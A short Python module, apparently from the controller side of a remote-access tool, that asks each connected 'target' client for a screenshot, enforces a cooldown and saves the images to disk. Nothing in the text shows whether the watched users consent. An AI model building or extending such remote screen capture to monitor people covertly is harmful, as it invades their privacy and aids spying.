import config
from datetime import datetime, timedelta
from os import makedirs, path


def screenshot():
    """ Gets a screenshot from the client and saves it to .\server_folder\screenshots"""
    for target in config.targets:
        if datetime.now() > config.client_list[target]['data']['last_screenshot_time'] + timedelta(minutes=config.SCREENSHOT_COOLDOWN):
            config.client_list[target]['data']['last_screenshot_time'] = datetime.now()
            config.log('Asking for client #{}\'s screenshot'.format(target))
            screenshot_data = config.send_to_client(target, 'screenshot', response=True, as_bytes=True)

            file_path = '.\screenshots\Client-{}-{}.png'.format(target, datetime.now().strftime('%d.%m.%Y'))
            makedirs(path.dirname(file_path), exist_ok=True)
            with open(file_path, 'wb') as f:
                f.write(screenshot_data)
            config.log('Done saving screenshot')
        else:
            config.log('Not taking a screenshot for client #{} since he\'s currently on cooldown. Please wait additional time.'.format(target))
